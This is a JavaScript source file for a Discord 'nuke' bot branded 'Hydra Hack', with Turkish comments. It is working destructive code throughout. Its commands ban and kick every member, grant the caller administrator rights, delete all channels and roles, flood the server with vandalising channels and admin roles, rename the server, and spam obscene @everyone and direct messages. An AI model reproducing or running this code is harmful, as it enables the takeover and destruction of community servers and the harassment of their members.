const Discord = require("discord.js"); ///Tüm Telif Hakları !EIEN r3c0rdˢᵏʸᵃʳᵐʸ#9999  Adlı Admine Aittir!
const client = new Discord.Client();  /// Paylaşım Yapılması Yasaktır
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {           
  if (msg.content === "!ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR 

client.on("message", msg => {
  if (msg.content === "!kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER  

client.on("message", async msg => {
  if (msg.content === "!duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR
    msg.delete()
    await msg.client.users
      .forEach(users =>
        users.send(
          "`Hydra Hack` **Her Daim Siker** :wink:"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "!yetki") {  //SIZE YÖNETICI YETKISI VERIR
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.createChannel("hydra-hack", {
      type: "text"
    });
    await msg.guild.createChannel("her-daim", {
      type: "text"
    });
    await msg.guild.createChannel("siker", {
      type: "text"
    });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
       await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Bu Sunucu", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Hydra Hack", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Tarafından", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("Patlatılmıştır!", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
    await msg.guild.setIcon("https://media.discordapp.net/attachments/745238152557363201/746365148217868438/cooltext360320925049726.png");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("Hydra Hack Tarafından Bu Sunucu Sikilmiştir!"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await msg.guild.owner.send("`Hydra Hack` Her Daim Siker!");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }   
});

 

    client.on("message", msg => {
  if (msg.content === "!rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu Sunucu HYDRA HACK Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
  }
});

client.on('message', msg => {
  if (msg.content === '!spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
          msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
